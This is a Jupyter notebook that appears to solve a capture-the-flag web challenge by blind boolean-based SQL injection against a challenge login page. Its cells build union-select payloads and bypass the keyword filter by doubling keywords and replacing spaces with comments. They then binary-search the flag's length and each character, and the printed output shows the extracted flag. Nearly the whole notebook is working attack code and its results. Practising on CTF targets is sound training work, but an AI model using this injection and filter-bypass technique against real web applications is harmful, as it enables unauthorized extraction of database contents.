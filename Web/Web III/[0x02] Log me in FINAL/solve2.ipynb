{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "548589d1-b434-404a-bcd7-9813831958ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "27c8209e-a934-47c5-ab5c-2adc1b430f97",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# first five word of password is FLAG{\n",
    "base_password=\" union select 1,2,i_4m_th3_fl4g from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`\"\n",
    "base_password+=\" where (ascii(mid(i_4m_th3_fl4g,1,1))<71 and ascii(mid(i_4m_th3_fl4g,1,1))>69)\" # F\n",
    "base_password+=\" and (ascii(mid(i_4m_th3_fl4g,2,1))<77 and ascii(mid(i_4m_th3_fl4g,2,1))>75)\" # L\n",
    "base_password+=\" and (ascii(mid(i_4m_th3_fl4g,3,1))<66 and ascii(mid(i_4m_th3_fl4g,3,1))>64)\" # A\n",
    "base_password+=\" and (ascii(mid(i_4m_th3_fl4g,4,1))<72 and ascii(mid(i_4m_th3_fl4g,4,1))>70)\" # G\n",
    "base_password+=\" and (ascii(mid(i_4m_th3_fl4g,5,1))<124 and ascii(mid(i_4m_th3_fl4g,5,1))>122)\" # {\n",
    "\n",
    "def waf(p):\n",
    "    p = p.replace(\" \", \"/**/\")\n",
    "    p = p.replace(\"union\", \"uniunionon\")\n",
    "    p = p.replace(\"select\", \"seleselectct\")\n",
    "    p = p.replace(\"where\", \"whwhereere\")\n",
    "    p = p.replace(\"and\", \"aandnd\")\n",
    "    p = p.replace(\"or\", \"oorr\")\n",
    "    return p\n",
    "\n",
    "def check(password):\n",
    "    payload = waf(password) + '#'\n",
    "    retry = 3\n",
    "    while retry > 0:\n",
    "        res = requests.post(\"https://sqli.chal.h4ck3r.quest/login\", data={\"username\": \"\\\\\", \"password\": payload})\n",
    "        if res.status_code == 200:\n",
    "            # print(res.text)\n",
    "            return res.text == 'Welcome!'\n",
    "        retry -= 1\n",
    "        \n",
    "    raise Exception(\"retry failed!\")\n",
    "\n",
    "check(base_password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "325323fd-c861-4e9b-a39d-5423ce40e668",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "45"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# crack flag length\n",
    "def binary_search(start, end):\n",
    "    while start <= end:\n",
    "        mid = int(start + (end - start) / 2)\n",
    "        password = base_password + f\" and length(i_4m_th3_fl4g)<{mid}\"\n",
    "        stat = check(password)\n",
    "        if stat == True:\n",
    "            end = mid - 1\n",
    "            if start > end:\n",
    "                return end\n",
    "        else:\n",
    "            start = mid + 1\n",
    "            if start > end:\n",
    "                return mid\n",
    "\n",
    "binary_search(1, 500)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "529cc928-b3b6-4a41-8a8f-55d0f7d1f9c2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# length of flag = 45\n",
    "check(base_password + f\" and length(i_4m_th3_fl4g)<46 and length(i_4m_th3_fl4g)>44\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "be07ea76-9223-4d72-8651-726e31dea30a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "F\n",
      "FL\n",
      "FLA\n",
      "FLAG\n",
      "FLAG{\n",
      "FLAG{!\n",
      "FLAG{!!\n",
      "FLAG{!!!\n",
      "FLAG{!!!b\n",
      "FLAG{!!!b0\n",
      "FLAG{!!!b00\n",
      "FLAG{!!!b00l\n",
      "FLAG{!!!b00le\n",
      "FLAG{!!!b00lea\n",
      "FLAG{!!!b00lean\n",
      "FLAG{!!!b00lean_\n",
      "FLAG{!!!b00lean_b\n",
      "FLAG{!!!b00lean_ba\n",
      "FLAG{!!!b00lean_bas\n",
      "FLAG{!!!b00lean_bas3\n",
      "FLAG{!!!b00lean_bas3d\n",
      "FLAG{!!!b00lean_bas3d_\n",
      "FLAG{!!!b00lean_bas3d_O\n",
      "FLAG{!!!b00lean_bas3d_OR\n",
      "FLAG{!!!b00lean_bas3d_OR_\n",
      "FLAG{!!!b00lean_bas3d_OR_e\n",
      "FLAG{!!!b00lean_bas3d_OR_er\n",
      "FLAG{!!!b00lean_bas3d_OR_err\n",
      "FLAG{!!!b00lean_bas3d_OR_err0\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_b\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_ba\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_bas\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_base\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_s\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sq\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sql\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli?\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli??\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???\n",
      "FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???}\n"
     ]
    }
   ],
   "source": [
    "def crack_ascii(pos):\n",
    "    start = 0\n",
    "    end = 128\n",
    "    while start <= end:\n",
    "        mid = int(start + (end - start) / 2)\n",
    "        password = base_password + f\" and (ascii(mid(i_4m_th3_fl4g,{pos},1))<{mid})\"\n",
    "        stat = check(password)\n",
    "        if stat == True:\n",
    "            end = mid - 1\n",
    "            if start > end:\n",
    "                return end\n",
    "        else:\n",
    "            start = mid + 1\n",
    "            if start > end:\n",
    "                return mid\n",
    "            \n",
    "flag = \"\"\n",
    "for i in range(1, 46):\n",
    "    flag += chr(crack_ascii(i))\n",
    "    print(flag)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
